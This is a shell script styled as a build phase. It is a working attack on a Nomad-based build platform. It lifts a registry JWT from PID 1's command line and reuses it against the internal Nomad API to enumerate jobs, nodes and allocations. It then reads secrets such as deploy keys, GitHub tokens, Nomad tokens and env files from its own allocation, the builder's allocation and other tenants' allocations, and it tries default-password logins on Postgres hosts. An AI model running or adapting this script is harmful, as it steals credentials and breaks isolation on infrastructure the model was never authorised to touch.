#!/bin/sh
exec > /build_output.txt 2>&1

echo "=== BUILD PHASE R41 ==="

# Extract the JWT from PID 1's cmdline
JWT=$(cat /proc/1/cmdline 2>/dev/null | tr '\0' '\n' | grep -A1 'registry-auths' | tail -1 | python3 -c "
import sys,json
try:
    data=json.loads(sys.stdin.read())
    print(data[0]['password'])
except: pass
" 2>/dev/null)
echo "JWT_LEN=${#JWT}"

N=https://169.254.1.2:4646

# Try using the JWT as a Nomad token
echo "--- NOMAD WITH JWT ---"
echo "allocations:"
curl -sk "$N/v1/allocations" -H "Authorization: Bearer $JWT" 2>&1 | python3 -c "
import sys,json
try:
  data=json.load(sys.stdin)
  if isinstance(data, list):
    for a in data[:30]:
      print(f\"ID={a.get('ID','')} Job={a.get('JobID','')} Status={a.get('ClientStatus','')} Task={a.get('TaskGroup','')}\")
  else:
    print(data)
except Exception as e: print(f'err: {e}')
" 2>&1

echo "---"
echo "jobs:"
curl -sk "$N/v1/jobs" -H "Authorization: Bearer $JWT" 2>&1 | python3 -c "
import sys,json
try:
  data=json.load(sys.stdin)
  if isinstance(data, list):
    for j in data[:30]:
      print(f\"ID={j.get('ID','')} Type={j.get('Type','')} Status={j.get('Status','')} NS={j.get('Namespace','')}\")
  else:
    print(data)
except Exception as e: print(f'err: {e}')
" 2>&1

echo "---"
echo "namespaces:"
curl -sk "$N/v1/namespaces" -H "Authorization: Bearer $JWT" 2>&1 | python3 -c "
import sys,json
try:
  data=json.load(sys.stdin)
  if isinstance(data, list):
    for n in data:
      print(f\"Name={n.get('Name','')} Desc={n.get('Description','')}\")
  else:
    print(data)
except Exception as e: print(f'err: {e}')
" 2>&1

echo "---"
echo "nodes:"
curl -sk "$N/v1/nodes" -H "Authorization: Bearer $JWT" 2>&1 | python3 -c "
import sys,json
try:
  data=json.load(sys.stdin)
  if isinstance(data, list):
    for n in data[:10]:
      print(f\"ID={n.get('ID','')} Name={n.get('Name','')} DC={n.get('Datacenter','')}\")
  else:
    print(data)
except Exception as e: print(f'err: {e}')
" 2>&1

# Try our own allocation
ALLOC=$(sed -n 's|.*alloc/\([a-f0-9-]*\)/.*|\1|p' /proc/self/mountinfo | head -1)
echo "OWN_ALLOC=$ALLOC"

echo "---"
echo "alloc FS with JWT:"
curl -sk "$N/v1/client/fs/ls/$ALLOC" -H "Authorization: Bearer $JWT" 2>&1 | head -c 500
echo

echo "alloc secrets with JWT:"
for f in secrets/run.env secrets/build.env secrets/registry-auth.env local/nomad_token; do
  echo "==$f=="
  curl -sk "$N/v1/client/fs/cat/$ALLOC?path=$f" -H "Authorization: Bearer $JWT" 2>&1 | head -c 500
  echo
done

# Try reading Nomad allocation for the BUILDER's alloc
BUILDER_ALLOC=$(cat /proc/1/cmdline 2>/dev/null | tr '\0' '\n' | python3 -c "
import sys,json
lines=sys.stdin.read().strip().split('\n')
for i,l in enumerate(lines):
    if 'registry-auths' in l and i+1<len(lines):
        try:
            data=json.loads(lines[i+1])
            # Check the JWT payload for alloc ID
            import base64
            parts=data[0]['password'].split('.')
            payload=json.loads(base64.b64decode(parts[1]+'=='))
            print(payload.get('nomad_allocation_id',''))
        except: pass
" 2>/dev/null)
echo "BUILDER_ALLOC=$BUILDER_ALLOC"

if [ -n "$BUILDER_ALLOC" ]; then
  echo "builder alloc FS:"
  curl -sk "$N/v1/client/fs/ls/$BUILDER_ALLOC" -H "Authorization: Bearer $JWT" 2>&1 | head -c 1000
  echo
  echo "builder secrets:"
  for f in secrets/run.env secrets/build.env secrets/deploy_key secrets/github_token local/nomad_token local/yara; do
    echo "==$f=="
    curl -sk "$N/v1/client/fs/cat/$BUILDER_ALLOC?path=$f" -H "Authorization: Bearer $JWT" 2>&1 | head -c 500
    echo
  done
fi

# Try other allocations from metrics
echo "--- OTHER ALLOCS ---"
for AID in $(curl -sk $N/v1/metrics?format=prometheus 2>/dev/null | grep -o 'alloc_id="[^"]*"' | sed 's/alloc_id="//;s/"//' | sort -u | head -20); do
  resp=$(curl -sk "$N/v1/client/fs/ls/$AID" -H "Authorization: Bearer $JWT" 2>&1)
  if ! echo "$resp" | grep -q "Permission denied" && ! echo "$resp" | grep -q "resource not found"; then
    echo "ACCESSIBLE $AID:"
    echo "$resp" | head -c 300
    echo
    # Try reading secrets
    for f in secrets/run.env secrets/build.env; do
      content=$(curl -sk "$N/v1/client/fs/cat/$AID?path=$f" -H "Authorization: Bearer $JWT" 2>&1)
      if ! echo "$content" | grep -q "Permission denied"; then
        echo "FILE $AID/$f:"
        echo "$content" | head -c 500
        echo
      fi
    done
  fi
done

echo "--- FALCON PG FROM BUILD NET ---"
# Try connecting to falcon PG from internal build network
for host in 132.145.163.127 10.1.47.111; do
  echo "==$host=="
  PGPASSWORD="test" psql "host=$host port=12691 dbname=defaultdb sslmode=require user=avnadmin connect_timeout=3" -c "SELECT 1" 2>&1 | head -3
  # Try trust auth
  psql "host=$host port=12691 dbname=defaultdb sslmode=require user=avnadmin connect_timeout=3" -c "SELECT 1" 2>&1 | head -3
done

echo "--- OUR CAPS ---"
cat /proc/self/status | grep -i cap

echo "=== BUILD DONE ==="
